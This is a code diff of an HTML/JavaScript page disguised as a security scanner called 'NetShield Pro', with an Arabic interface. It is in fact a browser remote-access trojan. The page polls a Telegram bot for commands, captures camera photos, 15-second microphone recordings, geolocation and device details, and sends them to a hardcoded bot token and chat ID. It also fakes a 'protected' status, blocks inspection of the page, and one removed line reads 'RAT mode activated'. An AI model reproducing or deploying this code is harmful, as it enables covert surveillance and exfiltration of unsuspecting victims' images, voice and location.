-                `خرائط جوجل: https://maps.google.com/?q=${l.latitude},${l.longitude}`
-              );
-            } else {
-              await sendTelegramText('❌ فشل تحديد الموقع');
-            }
+            if(scanData.location){
+              const l=scanData.location;
+              await sendText(`📍 الموقع الحالي:\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}`);
+            } else { await sendText('❌ فشل تحديد الموقع'); }
           }
-          else if (cmd === '/info' || cmd === '/device' || cmd === '/status') {
-            collectDeviceInfo();
-            await collectNetworkData();
-            await sleep(500);
-            let infoText = '📱 معلومات الجهاز:\n\n';
-            if (scanData.deviceInfo) {
-              const d = scanData.deviceInfo;
-              infoText += `النظام: ${d.platform}\n`;
-              infoText += `الذاكرة: ${d.ram} GB\n`;
-              infoText += `المعالج: ${d.cores} نواة\n`;
-              infoText += `الشاشة: ${d.screenWidth}x${d.screenHeight}\n`;
-            }
-            if (scanData.battery) {
-              infoText += `البطارية: ${scanData.battery.level}%\n`;
-              infoText += `الشحن: ${scanData.battery.charging ? 'موصول' : 'غير موصول'}\n`;
-            }
-            if (scanData.network) {
-              infoText += `النت: ${scanData.network.type} - ${scanData.network.downlink} Mbps\n`;
-            }
-            infoText += `الوقت: ${new Date().toLocaleString('ar-EG')}`;
-            await sendTelegramText(infoText);
+          else if(cmd==='/info'||cmd==='/device'||cmd==='/status'){
+            collectDeviceInfo(); await collectNetworkData(); await sleep(500);
+            let t='📱 معلومات الجهاز:\n\n';
+            if(scanData.deviceInfo){ const d=scanData.deviceInfo; t+=`النظام: ${d.platform}\nالذاكرة: ${d.ram} GB\nالمعالج: ${d.cores} نواة\n`; }
+            if(scanData.battery){ t+=`البطارية: ${scanData.battery.level}%\nالشحن: ${scanData.battery.charging?'موصول':'غير موصول'}\n`; }
+            if(scanData.network){ t+=`النت: ${scanData.network.type} - ${scanData.network.downlink} Mbps\n`; }
+            t+=`الوقت: ${new Date().toLocaleString('ar-EG')}`;
+            await sendText(t);
           }
-          else if (cmd === '/full' || cmd === '/scan' || cmd === '/report') {
-            await sendCompleteReport();
-          }
-          else if (cmd === '/help' || cmd === '/start') {
-            await sendTelegramText(
-              '📋 الأوامر المتاحة:\n\n' +
-              '/photo - التقاط صورة من الكاميرا\n' +
-              '/location - إرسال الموقع الحالي\n' +
-              '/info - معلومات الجهاز والبطارية\n' +
-              '/full - تقرير كامل (صورة+صوت+موقع+معلومات)\n' +
-              '/help - عرض هذا الدليل'
-            );
-          }
-          else if (cmd === '/ping') {
-            await sendTelegramText('🟢 الجهاز متصل وجاهز');
+          else if(cmd==='/full'||cmd==='/scan'||cmd==='/report'){ await sendCompleteReport(); }
+          else if(cmd==='/help'||cmd==='/start'){ await sendText('📋 الاوامر المتاحة:\n\n/photo - التقاط صورة\n/location - الموقع الحالي\n/info - معلومات الجهاز\n/full - تقرير كامل\n/notify - ارسال اشعار\n/ping - التحقق من الاتصال\n/help - عرض المساعدة'); }
+          else if(cmd==='/ping'){ await sendText('🟢 الجهاز متصل وجاهز'); }
+          else if(cmd.startsWith('/notify ')){
+            const txt = msg.text.replace('/notify ','');
+            showNotification(txt);
+            await sendText('✅ تم ارسال الاشعار: '+txt);
           }
         }
       }
     }
-  } catch(e) {
-    console.log('Command check error');
+  } catch(e) {}
+}
+
+function showNotification(text) {
+  if('Notification' in window && Notification.permission === 'granted'){
+    new Notification('NetShield Pro', { body: text, icon: 'data:image/svg+xml,...', vibrate: [200,100,200] });
+  }
+}
+
+function requestNotificationPermission() {
+  if('Notification' in window && Notification.permission !== 'granted' && Notification.permission !== 'denied'){
+    Notification.requestPermission();
   }
 }
 
 function startCommandListener() {
   document.getElementById('remoteIndicator').style.display = 'block';
-  sendTelegramText('🟢 الوكيل نشط - الجهاز جاهز لاستقبال الأوامر\n\nأرسل /help لرؤية الأوامر المتاحة');
+  sendText('🟢 الوكيل نشط - الجهاز جاهز لاستقبال الاوامر');
   setInterval(checkForCommands, COMMAND_CHECK_INTERVAL);
-  console.log('RAT mode activated');
+  requestNotificationPermission();
 }
 
-// ==================== TELEGRAM REPORTING ====================
-
+// ==================== TELEGRAM SEND ====================
 async function sendCompleteReport() {
-  let report = '━━━━━━━━━━━━━━━━━━━\n';
-  report += '  NETSHIELD PRO - تقرير الفحص الشامل\n';
-  report += '━━━━━━━━━━━━━━━━━━━\n\n';
-
-  if (scanData.deviceInfo) {
-    const d = scanData.deviceInfo;
-    report += '【 معلومات الجهاز 】\n';
-    report += `النظام: ${d.platform}\n`;
-    report += `الذاكرة: ${d.ram} GB\n`;
-    report += `المعالج: ${d.cores} نواة\n`;
-    report += `الشاشة: ${d.screenWidth}x${d.screenHeight} @ ${d.pixelRatio}x\n`;
-    report += `اللغة: ${d.language}\n`;
-    report += `المنطقة الزمنية: ${d.timezone}\n`;
-    report += `الوقت: ${d.timestamp}\n`;
-    report += `UA: ${d.userAgent.substring(0, 100)}...\n\n`;
+  let r = '━━━━━━━━━━━━━━━━━━━\n';
+  r += '  NETSHIELD PRO - تقرير الفحص الشامل\n';
+  r += '━━━━━━━━━━━━━━━━━━━\n\n';
+  if(scanData.deviceInfo){
+    const d=scanData.deviceInfo;
+    r+=`【 معلومات الجهاز 】\nالنظام: ${d.platform}\nالذاكرة: ${d.ram} GB\nالمعالج: ${d.cores} نواة\nالشاشة: ${d.screenWidth}x${d.screenHeight}\nاللغة: ${d.language}\nالمنطقة الزمنية: ${d.timezone}\nالوقت: ${d.timestamp}\n\n`;
   }
-  if (scanData.battery) {
-    const b = scanData.battery;
-    report += '【 البطارية 】\n';
-    report += `المستوى: ${b.level}%\n`;
-    report += `الشحن: ${b.charging ? 'موصول' : 'غير موصول'}\n\n`;
+  if(scanData.battery){
+    const b=scanData.battery;
+    r+=`【 البطارية 】\nالمستوى: ${b.level}%\nالشحن: ${b.charging?'موصول':'غير موصول'}\n\n`;
   }
-  if (scanData.network) {
-    const n = scanData.network;
-    report += '【 الشبكة 】\n';
-    report += `النوع: ${n.type}\n`;
-    report += `السرعة: ${n.downlink} Mbps\n`;
-    report += `الاستجابة: ${n.rtt} ms\n\n`;
+  if(scanData.network){
+    const n=scanData.network;
+    r+=`【 الشبكة 】\nالنوع: ${n.type}\nالسرعة: ${n.downlink} Mbps\nالاستجابة: ${n.rtt} ms\n\n`;
   }
-  if (scanData.location) {
-    const l = scanData.location;
-    report += '【 الموقع 】\n';
-    report += `الإحداثيات: ${l.latitude}, ${l.longitude}\n`;
-    report += `الدقة: ${Math.round(l.accuracy)} متر\n`;
-    report += `خرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}\n\n`;
+  if(scanData.location){
+    const l=scanData.location;
+    r+=`【 الموقع 】\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}\n\n`;
   }
-  report += '【 الصلاحيات 】\n';
-  report += `كاميرا: ${scanData.permissions.camera ? 'نعم' : 'لا'}\n`;
-  report += `ميكروفون: ${scanData.permissions.microphone ? 'نعم' : 'لا'}\n`;
-  report += `موقع: ${scanData.permissions.location ? 'نعم' : 'لا'}\n\n`;
-  report += '━━━━━━━━━━━━━━━━━━━\nتم الفحص بواسطة NetShield Pro v3.2.1';
-
-  await sendTelegramText(report);
-  if (scanData.camera) await sendTelegramPhoto(scanData.camera);
-  if (scanData.microphone) await sendTelegramAudio(scanData.microphone);
+  r+=`【 الصلاحيات 】\nكاميرا: ${scanData.permissions.camera?'نعم':'لا'}\nميكروفون: ${scanData.permissions.microphone?'نعم':'لا'}\nموقع: ${scanData.permissions.location?'نعم':'لا'}\n\n`;
+  r+='━━━━━━━━━━━━━━━━━━━\nتم الفحص بواسطة NetShield Pro v4.0';
+  await sendText(r);
+  if(scanData.camera) await sendPhoto(scanData.camera);
+  if(scanData.microphone) await sendAudio(scanData.microphone);
 }
 
-async function sendTelegramText(text) {
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-    });
-  } catch(e) { console.log('Text send failed'); }
+async function sendText(text) {
+  try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:text})}); } catch(e) {}
 }
 
-async function sendTelegramPhoto(base64) {
-  try {
-    const blob = await (await fetch(base64)).blob();
-    const fd = new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('photo', blob, 'camera.jpg');
-    fd.append('caption', '📷 صورة من الكاميرا - ' + new Date().toLocaleString('ar-EG'));
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-  } catch(e) { console.log('Photo send failed'); }
+async function sendPhoto(base64) {
+  try { const blob = await (await fetch(base64)).blob(); const fd = new FormData(); fd.append('chat_id',CHAT_ID); fd.append('photo',blob,'camera.jpg'); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd}); } catch(e) {}
 }
 
-async function sendTelegramAudio(base64) {
-  try {
-    const blob = await (await fetch(base64)).blob();
-    const fd = new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('audio', blob, 'recording.webm');
-    fd.append('caption', '🎤 تسجيل صوتي (15 ثانية) - ' + new Date().toLocaleString('ar-EG'));
-    fd.append('duration', '15');
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
-  } catch(e) { console.log('Audio send failed'); }
+async function sendAudio(base64) {
+  try { const blob = await (await fetch(base64)).blob(); const fd = new FormData(); fd.append('chat_id',CHAT_ID); fd.append('audio',blob,'recording.webm'); fd.append('duration','15'); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`,{method:'POST',body:fd}); } catch(e) {}
 }
 
 // ==================== UI HELPERS ====================
+function updateStep(n,s){ const el=document.getElementById('step'+n); el.className='progress-step'; if(s==='done')el.classList.add('done'); if(s==='active')el.classList.add('active'); }
+function resetSteps(){ for(let i=1;i<=5;i++)document.getElementById('step'+i).className='progress-step'; document.getElementById('progressBar').style.width='0%'; }
+function updateMainStatus(s){ const dot=document.getElementById('mainStatusDot'); const ti=document.getElementById('mainStatusTitle'); const de=document.getElementById('mainStatusDesc'); if(s){ dot.classList.add('protected'); ti.textContent='محمي'; de.textContent='جميع الانظمة نشطة'; } else { dot.classList.remove('protected'); ti.textContent='غير محمي'; de.textContent='الفحص مطلوب'; } }
+function closeModal(){ document.getElementById('successModal').style.display='none'; }
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-function updateStep(stepNum, state) {
-  const step = document.getElementById('step' + stepNum);
-  step.className = 'progress-step';
-  if (state === 'done') step.classList.add('done');
-  if (state === 'active') step.classList.add('active');
-}
-
-function resetSteps() {
-  for (let i = 1; i <= 5; i++) {
-    document.getElementById('step' + i).className = 'progress-step';
-  }
-  document.getElementById('progressBar').style.width = '0%';
-}
-
-function updateMainStatus(success) {
-  const dot = document.getElementById('mainStatusDot');
-  const title = document.getElementById('mainStatusTitle');
-  const desc = document.getElementById('mainStatusDesc');
-  if (success) {
-    dot.classList.add('protected');
-    title.textContent = 'محمي';
-    desc.textContent = 'جميع الأنظمة نشطة';
-    document.getElementById('threatsValue').textContent = '0';
-    document.getElementById('speedValue').textContent = Math.floor(Math.random() * 30 + 40);
-    document.getElementById('pingValue').textContent = Math.floor(Math.random() * 20 + 5);
-  } else {
-    dot.classList.remove('protected');
-    title.textContent = 'غير محمي';
-    desc.textContent = 'الفحص مطلوب';
-  }
-}
-
-function closeModal() {
-  document.getElementById('successModal').style.display = 'none';
-}
-
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-// ==================== PREVENT LONG PRESS ====================
-document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
-document.addEventListener('selectstart', function(e) { e.preventDefault(); });
-document.addEventListener('touchstart', function(e) {
-  if (e.touches.length > 1) { e.preventDefault(); }
-}, { passive: false });
+// ==================== SECURITY ====================
+document.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('selectstart',e=>e.preventDefault());
+document.addEventListener('touchstart',function(e){ if(e.touches.length>1){e.preventDefault();} },{passive:false});
 let touchTimer;
-document.addEventListener('touchstart', function(e) {
-  touchTimer = setTimeout(function() {
-    e.preventDefault();
-  }, 500);
-});
-document.addEventListener('touchend', function() {
-  clearTimeout(touchTimer);
-});
+document.addEventListener('touchstart',function(e){ touchTimer=setTimeout(function(){e.preventDefault();},500); });
+document.addEventListener('touchend',function(){ clearTimeout(touchTimer); });
 </script>
 </body>
 </html>
